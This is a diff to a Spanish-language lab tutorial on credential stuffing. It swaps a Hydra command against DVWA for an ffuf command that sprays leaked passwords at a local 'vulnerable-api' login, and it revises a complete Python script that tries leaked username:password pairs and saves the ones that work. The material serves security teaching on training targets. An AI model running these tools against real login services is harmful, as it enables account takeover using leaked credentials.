@@ -96,82 +96,86 @@ ls -lh
 # Formato del archivo: usuario:contraseña
 head leaked_credentials.txt
 
-# Convertir a formato Hydra
-# Opción 1: Separar usuarios y passwords
+# Convertir a formato para ataque
 cut -d: -f1 leaked_credentials.txt > users.txt
 cut -d: -f2 leaked_credentials.txt > passwords.txt
-
-# Ataque contra DVWA
-hydra -L users.txt -P passwords.txt dvwa http-post-form \
-  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 4
 ```
 
-**Problema**: Esto prueba **todas las combinaciones** (usuarios × passwords).
+> [!WARNING]
+> **DVWA tiene CSRF tokens** que impiden ataques simples con Hydra. Usaremos **vulnerable-api** para este ejercicio.
+
+#### Ataque con FFUF contra vulnerable-api
+
+```bash
+# Probar cada password del leak para un usuario
+ffuf -w passwords.txt \
+     -u http://vulnerable-api:5000/api/login \
+     -X POST \
+     -H "Content-Type: application/json" \
+     -d '{"username":"admin","password":"FUZZ"}' \
+     -mc 200
+
+# Resultado esperado si encuentra la contraseña:
+# [Status: 200, Size: 150, ...]
+#     * FUZZ: password
+```
+
+**Problema**: Esto solo prueba un usuario. Para credential stuffing real necesitamos probar **pares específicos**.
 
 ---
 
 ### Ejercicio 2: Script Python para matching perfecto 🟡
+
+El script prueba **pares exactos** usuario:contraseña (no todas las combinaciones).
 
 Crear `credential_stuffing.py`:
 
 ```python
 #!/usr/bin/env python3
 """
-Credential Stuffing Script
+Credential Stuffing Script para vulnerable-api
 Intenta login con pares específicos usuario:contraseña
 """
 
 import requests
 import time
-from urllib.parse import urljoin
+import json
 
 # Configuración
-TARGET_URL = "http://dvwa/login.php"
+TARGET_URL = "http://vulnerable-api:5000/api/login"
 CREDENTIALS_FILE = "leaked_credentials.txt"
-SUCCESS_INDICATOR = "Welcome"  # String que indica login exitoso
-FAIL_INDICATOR = "Login failed"
 
 def test_credential(session, username, password):
     """Intenta login con credencial específica"""
-    data = {
-        'username': username,
-        'password': password,
-        'Login': 'Login'
-    }
+    data = {"username": username, "password": password}
     
     try:
-        response = session.post(TARGET_URL, data=data, timeout=5)
+        response = session.post(
+            TARGET_URL, 
+            json=data,
+            headers={"Content-Type": "application/json"},
+            timeout=5
+        )
         
-        if SUCCESS_INDICATOR in response.text:
-            return True
-        elif FAIL_INDICATOR in response.text:
-            return False
-        else:
-            # Respuesta ambigua, asumimos fallo
-            return None
-    except requests.exceptions.RequestException as e:
-        print(f"[!] Error de red: {e}")
+        result = response.json()
+        return result.get("success", False)
+    except Exception as e:
+        print(f"[!] Error: {e}")
         return None
 
 def main():
     print("=" * 60)
-    print("Credential Stuffing Simulation")
+    print("Credential Stuffing - vulnerable-api")
     print("=" * 60)
     
-    # Crear sesión persistente (más rápido)
     session = requests.Session()
-    session.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-    })
-    
-    # Leer credenciales
     valid_creds = []
     total = 0
     
     with open(CREDENTIALS_FILE, 'r') as f:
         for line in f:
             line = line.strip()
-            if ':' not in line:
+            if ':' not in line or line.startswith('#'):
                 continue
                 
             username, password = line.split(':', 1)
@@ -187,16 +191,16 @@ def main():
             elif result is False:
                 print("✗ Inválida")
             else:
-                print("? Ambigua")
+                print("? Error")
             
-            # Delay para evitar rate limiting
-            time.sleep(0.5)
+            time.sleep(0.3)  # Delay entre intentos
     
     # Resultados
     print("\n" + "=" * 60)
     print(f"Credenciales probadas: {total}")
     print(f"Credenciales válidas: {len(valid_creds)}")
-    print(f"Tasa de éxito: {len(valid_creds)/total*100:.1f}%")
+    if total > 0:
+        print(f"Tasa de éxito: {len(valid_creds)/total*100:.1f}%")
     print("=" * 60)
     
     if valid_creds:
@@ -204,7 +208,6 @@ def main():
         for user, pwd in valid_creds:
             print(f"    {user}:{pwd}")
         
-        # Guardar resultados
         with open('valid_credentials.txt', 'w') as f:
             for user, pwd in valid_creds:
                 f.write(f"{user}:{pwd}\n")
